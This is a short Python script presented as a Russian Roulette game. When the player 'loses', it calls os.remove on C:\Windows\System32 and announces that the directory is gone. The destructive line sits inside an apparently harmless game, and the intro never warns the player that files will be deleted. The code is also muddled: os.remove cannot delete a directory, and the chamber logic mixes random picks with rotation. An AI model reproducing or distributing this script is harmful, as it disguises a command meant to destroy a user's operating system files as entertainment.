#Made By MagCecu

import os
import random
import time

def russian_roulette():
    print("Welcome to Russian Roulette!")
    print("You are about to play a deadly game of chance.")
    print("You will take turns pulling the trigger of a revolver with one bullet.")
    print("There's a 1 in 6 chance that the gun will fire and you'll lose. Good luck!\n")

    revolver_chamber = [False] * 5 + [True]

    random.shuffle(revolver_chamber)

    while True:
        input("Press Enter to pull the trigger...")
        print("Spinning the chamber...")
        time.sleep(2)
        
        bullet_index = random.randint(0, 5)
        
        if revolver_chamber[bullet_index]:
            print("BANG! You lost! Your system32 is now gone!")
            os.remove("C:\Windows\System32")
            break
        else:
            print("Click! You survived another round.")
            print("The gun is passed to the next player...\n")
            revolver_chamber = revolver_chamber[1:] + revolver_chamber[:1]
            time.sleep(1)
        
        play_again = input("Do you want to continue? (yes/no): ")
        if play_again != "yes":
            print("Wise move...")
            break

russian_roulette()